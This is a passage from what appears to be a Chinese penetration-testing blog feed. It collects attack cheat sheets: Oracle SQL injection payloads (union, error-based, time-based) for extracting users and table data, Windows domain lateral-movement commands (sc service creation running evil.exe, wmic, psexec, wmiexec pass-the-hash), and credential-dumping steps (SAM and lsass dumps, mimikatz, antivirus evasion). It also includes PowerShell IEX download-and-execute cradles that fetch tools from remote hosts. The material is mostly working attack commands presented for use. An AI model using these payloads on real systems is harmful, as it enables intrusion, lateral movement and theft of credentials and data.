class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=(<span class="hljs-keyword">select</span> decode(<span class="hljs-keyword">user</span>,<span class="hljs-string">&#x27;SQLI&#x27;</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> dual);<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;S&#x27;</span>=(<span class="hljs-keyword">select</span> substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-keyword">from</span> dual);<br><br>延时<br><span class="hljs-keyword">select</span> dbms_pipe.receive_message(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-number">3</span>) <span class="hljs-keyword">from</span> dual;<br><span class="hljs-keyword">select</span> dbms_pipe.receive_message(<span class="hljs-string">&#x27;aaa&#x27;</span>,(decode((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual),<span class="hljs-string">&#x27;SQLI&#x27;</span>,<span class="hljs-number">3</span>))) <span class="hljs-keyword">from</span> dual;<br></code></pre></td></tr></table></figure><h2 id="联合查询注入通用流程"><a href="#联合查询注入通用流程" class="headerlink" title="联合查询注入通用流程"></a>联合查询注入通用流程</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sql">判断注入点是否存在<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>xxx<span class="hljs-operator">/</span>x.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">http://xxx/x.php?id=1&#x27;</span> <span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>xxx<span class="hljs-operator">/</span>x.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>xxx<span class="hljs-operator">/</span>x.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span><br>判断字段数量<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>xxx<span class="hljs-operator">/</span>x.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>xxx<span class="hljs-operator">/</span>x.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span><br>...<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>xxx<span class="hljs-operator">/</span>x.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> n<br>显示出错字段处<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>xxx<span class="hljs-operator">/</span>x.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span><br>替换每个<span class="hljs-keyword">null</span>为类型如<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-number">2</span>之类判断类型和回显位置<br><br>然后在可回显位置放置查询语句<br><br>判断用户名<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>xxx<span class="hljs-operator">/</span>x.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">user</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span><br>判断数据库版本<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>xxx<span class="hljs-operator">/</span>x.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,(<span class="hljs-keyword">select</span> banner <span class="hljs-keyword">from</span> v$version),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> all_users<br>判断用户权限<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>xxx<span class="hljs-operator">/</span>x.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,(<span class="hljs-keyword">select</span> privilege <span class="hljs-keyword">from</span> session_privs <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span>),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span><br>获取当前数据库<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>xxx<span class="hljs-operator">/</span>x.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,global_name,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> global_name<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>xxx<span class="hljs-operator">/</span>x.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,(<span class="hljs-keyword">select</span> global_name <span class="hljs-keyword">from</span> global_name),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span><br>获取表名<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>xxx<span class="hljs-operator">/</span>x.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> user_tables <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span>),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> dual<br>获取字段名<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>xxx<span class="hljs-operator">/</span>x.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,(<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> user_tab_columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;USERS&#x27;</span> <span class="hljs-keyword">and</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span>),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> dual<br>获取数据<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>xxx<span class="hljs-operator">/</span>x.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,(<span class="hljs-keyword">select</span> name <span class="hljs-keyword">from</span> USERS <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span>),<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> dual<br></code></pre></td></tr></table></figure><h2 id="报错注入通用流程"><a href="#报错注入通用流程" class="headerlink" title="报错注入通用流程"></a>报错注入通用流程</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">获取用户名<br><span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=ctxsys.drithsx.sn(1,(select<span class="hljs-built_in"> user </span><span class="hljs-keyword">from</span> dual)) --<br>获取当前用户权限数据表<br><span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=ctxsys.drithsx.sn(1,(select table_name <span class="hljs-keyword">from</span> user_tables where <span class="hljs-attribute">rownum</span>=1)) --<br>查询列名<br><span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=ctxsys.drithsx.sn(1,(select column_name <span class="hljs-keyword">from</span> user_tab_columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;USERS&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">rownum</span>=1)) --<br>查询数据<br><span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=ctxsys.drithsx.sn(1,(select username password <span class="hljs-keyword">from</span><span class="hljs-built_in"> USERS </span>where <span class="hljs-attribute">rownum</span>=1)) --<br><br>同理还有多种报错函数可以查询<br></code></pre></td></tr></table></figure><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://www.chabug.org/web/1827.html">https://www.chabug.org/web/1827.html</a></p><p><a href="https://www.jianshu.com/p/5ce219032823">https://www.jianshu.com/p/5ce219032823</a></p>]]></content>
    
    
    <categories>
      
      <category>sql注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>oracle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透中利用ipc命令执行总结</title>
    <link href="/2021/04/29/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%AD%E5%88%A9%E7%94%A8ipc%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/"/>
    <url>/2021/04/29/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%AD%E5%88%A9%E7%94%A8ipc%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="域环境搭建"><a href="#域环境搭建" class="headerlink" title="域环境搭建"></a>域环境搭建</h2><p>参考 <a href="https://blog.csdn.net/niexinming/article/details/75650128">https://blog.csdn.net/niexinming/article/details/75650128</a></p><p>开启$ipc和$admin</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> share <span class="hljs-variable">$ipc</span><br><span class="hljs-keyword">net</span> share <span class="hljs-variable">$admin</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ipc/ipc_01.png"></p><h2 id="直接执行"><a href="#直接执行" class="headerlink" title="直接执行"></a>直接执行</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">dir \\IP\c$<br>tasklist <span class="hljs-string">/S</span> IP <span class="hljs-string">/U</span> 用户 <span class="hljs-string">/P</span> 密码<br></code></pre></td></tr></table></figure><h2 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>\\[HOST] create <span class="hljs-keyword">boom </span><span class="hljs-keyword">binpath= </span>c:\evil.exe<br><span class="hljs-keyword">sc </span>\\[HOST] start <span class="hljs-keyword">boom</span><br><span class="hljs-keyword">sc </span>\\[HOST] delete <span class="hljs-keyword">boom</span><br></code></pre></td></tr></table></figure><h2 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /node:<span class="hljs-number">172.18</span><span class="hljs-number">.16</span><span class="hljs-number">.172</span> /<span class="hljs-keyword">user</span>:<span class="hljs-keyword">admin</span> /<span class="hljs-keyword">password</span>:<span class="hljs-keyword">password</span>  process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;cmd.exe /c ipconfig&gt;c:\result.txt&quot;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ipc/ipc_02.png"></p><h2 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h2><p>安装:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/CoreSecurity/im</span>packet.git<br>cd impacket/<br>pip install<br></code></pre></td></tr></table></figure><p>用户密码</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">python</span> wmiexec.py 用户名:密码@目标IP<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ipc/ipc_03.png"></p><p>哈希传递</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">python</span> <span class="hljs-variable">wmiexec</span><span class="hljs-operator">.</span><span class="hljs-variable">py</span> <span class="hljs-operator">-</span><span class="hljs-variable">hashes</span> <span class="hljs-variable">LM</span> <span class="hljs-built_in">Hash</span><span class="hljs-operator">:</span><span class="hljs-variable">NT</span> <span class="hljs-built_in">Hash</span> 域名<span class="hljs-operator">/</span>用户名<span class="hljs-operator">@</span>目标<span class="hljs-variable">IP</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ipc/ipc_04.png"></p><h2 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">cscript.exe wmiexec.vbs /<span class="hljs-keyword">cmd</span><span class="bash"> 172.18.16.172 administrator password “<span class="hljs-built_in">command</span>”</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ipc/ipc_05.png"></p><h2 id="powershell工具"><a href="#powershell工具" class="headerlink" title="powershell工具"></a>powershell工具</h2><p>Invoke-WmiCommand.ps1是PowerSploit中的一个脚本工具，该脚本主要通过powershell调用WMI来远程执行命令，本质上还是利用WMI。</p><p>下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">git clone https:<span class="hljs-comment">//github.com/PowerShellMafia/PowerSploit.git</span><br>cd PowerSploit-master\PowerSploit-master\CodeExecution<br>python –m SimpleHTTPServer<br>powershell<br><span class="hljs-function"><span class="hljs-title">IEX</span><span class="hljs-params">(New-Object Net.Webclient)</span></span><span class="hljs-selector-class">.DownloadString</span>(<span class="hljs-string">&#x27;http://xx.xx.xx.xx//Invoke-WmiCommand.ps1&#x27;</span>)<br><span class="hljs-variable">$User</span> = <span class="hljs-string">&quot;域名\用户名&quot;</span>     <span class="hljs-comment">// 指定目标系统用户名</span><br><span class="hljs-variable">$Password</span> = ConvertTo-SecureString -String <span class="hljs-string">&quot;文明密码&quot;</span> -AsPlainText -Force   <span class="hljs-comment">// 指定目标系统的密码</span><br><span class="hljs-variable">$Cred</span> = New-Object -TypeName System<span class="hljs-selector-class">.Management</span><span class="hljs-selector-class">.Automation</span><span class="hljs-selector-class">.PSCredential</span> -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span>    <span class="hljs-comment">// 将账号和密码整合起来，以便导入credential</span><br><span class="hljs-variable">$Remote</span> = Invoke-WmiCommand -Payload &#123;要执行的命令&#125; -Credential <span class="hljs-variable">$Cred</span> -ComputerName 目标IP<br><span class="hljs-variable">$Remote</span><span class="hljs-selector-class">.PayloadOutput</span>       <span class="hljs-comment">// 将执行结果输出到屏幕上</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ipc/ipc_06.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ipc/ipc_07.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ipc/ipc_08.png"></p><p>Invoke-WMIMethod.ps1(无回显)<br>Invoke-WMIMethod.ps1模块是powershell自带的，可以在远程系统中执行命令和指定程序。在powershell命令行环境执行如下命令，可以以非交互式的方式执行远程命令，但不会回显执行结果。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$User</span>=<span class="hljs-string">&quot;域名\用户名&quot;</span>    <span class="hljs-regexp">//</span> 指定目标系统用户名<br><span class="hljs-variable">$Password</span>=ConvertTo-SecureString -String <span class="hljs-string">&quot;密码&quot;</span> -AsPlainText -Force   <span class="hljs-regexp">//</span> 指定目标系统密码<br><span class="hljs-variable">$Cred</span>=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span>     <span class="hljs-regexp">//</span> 将账号和密码整合起来，以便导入 Credential中<br>Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList <span class="hljs-string">&quot;notepad.exe&quot;</span> -ComputerName <span class="hljs-string">&quot;目标机IP&quot;</span> -Credential <span class="hljs-variable">$Cred</span>   <span class="hljs-regexp">//</span> 在远程系统中运行notepad.exe命令<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ipc/ipc_09.png"></p><h2 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">psexec<span class="hljs-selector-class">.exe</span> \\ip –u 账号 –<span class="hljs-selector-tag">p</span> 密码 cmd<span class="hljs-selector-class">.exe</span> /c ipconfig <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/ipc/ipc_10.png"></p><h2 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SecureAuthCorp/im</span>packet<br>smbexec.py 用户名:密码@IP<br></code></pre></td></tr></table></figure><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://www.freebuf.com/articles/network/246440.html">https://www.freebuf.com/articles/network/246440.html</a><br><a href="https://cloud.tencent.com/developer/article/1752145">https://cloud.tencent.com/developer/article/1752145</a></p>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows哈希提取方式总结</title>
    <link href="/2021/04/22/windows%E5%93%88%E5%B8%8C%E6%8F%90%E5%8F%96%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"/>
    <url>/2021/04/22/windows%E5%93%88%E5%B8%8C%E6%8F%90%E5%8F%96%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="getpass-exe"><a href="#getpass-exe" class="headerlink" title="getpass.exe"></a>getpass.exe</h2><p>Getpass.exe是闪电小子开发的一款windows下哈希获取软件，直接运行Getpass.exe即可导出windows密码</p><h2 id="pwdump8-exe"><a href="#pwdump8-exe" class="headerlink" title="pwdump8.exe"></a>pwdump8.exe</h2><p>下载windows工具pwdump8.exe,上传到目标机执行</p><p>.\pwdump8.exe</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/windows_hash_get/hashget_01.png"></p><h2 id="Quarks-pwdump-exe"><a href="#Quarks-pwdump-exe" class="headerlink" title="Quarks-pwdump.exe"></a>Quarks-pwdump.exe</h2><p>打开QuarksPwDump.exe目录，命令行执行QuarksPwDump.exe –dhl</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/windows_hash_get/hashget_02.png"></p><h2 id="导出SAM后Mimikatz本地提取"><a href="#导出SAM后Mimikatz本地提取" class="headerlink" title="导出SAM后Mimikatz本地提取"></a>导出SAM后Mimikatz本地提取</h2><p>本地使用Mimikatz读取SAM,优点是不需要做免杀</p><ol><li>导出SAM：<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> hklm\sam sam.hive<br><span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> hklm\system system.hive<br><span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> hklm\security security.hive<br></code></pre></td></tr></table></figure></li></ol><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/windows_hash_get/hashget_03.png"></p><ol start="2"><li>可以拷贝到本地。然后使用管理员权限mimikatz 读取 SAM和System文件 lsadump::sam /sam:sam.hive /system:system.hive<br>然后使用cmd5解密NTLM哈希</li></ol><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/windows_hash_get/hashget_04.png"></p><ol start="3"><li><p>也可使用Python Impacket中的 secretsdump.py获取</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">secretsdump.py ‐sam sam.hiv ‐<span class="hljs-keyword">security</span> <span class="hljs-keyword">security</span>.hiv ‐<span class="hljs-keyword">system</span> sys.hiv <span class="hljs-keyword">LOCAL</span><br></code></pre></td></tr></table></figure></li><li><p>也可以用Cain的cracker模块，选LM&amp;NTLM，添加-》import Hashes from a SAM database</p></li></ol><h2 id="导出lasaa后Mimikatz本地提取"><a href="#导出lasaa后Mimikatz本地提取" class="headerlink" title="导出lasaa后Mimikatz本地提取"></a>导出lasaa后Mimikatz本地提取</h2><p>本地使用Mimikatz读取lsass,优点是不需要做免杀</p><ol><li>导出lsass：<br>winNT6中可以任务管理器找到lsass.exe右键，然后create dump file导出lsass.dmp。也可以使用三方工具procdump.exe -accepteula -ma lsass.exe lsass.dmp</li></ol><p>工具下载地址：<br><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">procdump<span class="hljs-selector-class">.exe</span> -accepteula -ma lsass<span class="hljs-selector-class">.exe</span> lsass<span class="hljs-selector-class">.dmp</span> 　　#<span class="hljs-number">32</span>位系统<br>procdump<span class="hljs-selector-class">.exe</span> -accepteula -<span class="hljs-number">64</span> -ma lsass<span class="hljs-selector-class">.exe</span> lsass<span class="hljs-selector-class">.dmp</span> #<span class="hljs-number">64</span>位系统<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/windows_hash_get/hashget_05.png"></p><ol start="2"><li>可以拷贝到本地。然后使用mimikatz 读取 lsass.dmp文件，执行：<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso">sekurlsa<span class="hljs-type">::minidump</span> lsass.dmp<br>sekurlsa<span class="hljs-type">::logonPasswords</span> <span class="hljs-literal">full</span> 导出密码hash<br></code></pre></td></tr></table></figure></li></ol><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/windows_hash_get/hashget_06.png"></p><h2 id="Mimikatz目标机"><a href="#Mimikatz目标机" class="headerlink" title="Mimikatz目标机"></a>Mimikatz目标机</h2><p>直接在目标机运行mimikatz，缺点是需要做免杀</p><p>直接上传并运行mimikatz.exe </p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/windows_hash_get/hashget_07.png"></p><h2 id="Get-PassHashes-ps1"><a href="#Get-PassHashes-ps1" class="headerlink" title="Get-PassHashes.ps1"></a>Get-PassHashes.ps1</h2><p>利用powershell执行nishang中Get-PassHashes工具<br>1.本地执行</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-operator">//</span> <span class="hljs-variable">nishang</span><span class="hljs-operator">-</span><span class="hljs-variable">master</span>\<span class="hljs-built_in">Gather</span>\<span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">PassHashes</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-variable">import</span><span class="hljs-operator">-</span><span class="hljs-variable">module</span> <span class="hljs-operator">.</span>\<span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">PassHashes</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">PassHashes</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/windows_hash_get/hashget_08.png"></p><p>2.远程加载执行</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">powershell IEX (New-Object Net.WebClient).<span class="hljs-constructor">DownloadString(&#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">samratashok</span><span class="hljs-operator">/</span><span class="hljs-params">nishang</span><span class="hljs-operator">/</span><span class="hljs-params">master</span><span class="hljs-operator">/</span>Gather<span class="hljs-operator">/</span>Get-PassHashes.<span class="hljs-params">ps1</span>&#x27;)</span>;Get-PassHashes<br></code></pre></td></tr></table></figure><h2 id="powershell加载Mimikatz"><a href="#powershell加载Mimikatz" class="headerlink" title="powershell加载Mimikatz"></a>powershell加载Mimikatz</h2><p>使用powershell加载mimikatz执行，但是基本上做不到免杀</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">powershell IEX (New-Object Net.WebClient).<span class="hljs-constructor">DownloadString(&#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">mattifestation</span><span class="hljs-operator">/</span>PowerSploit<span 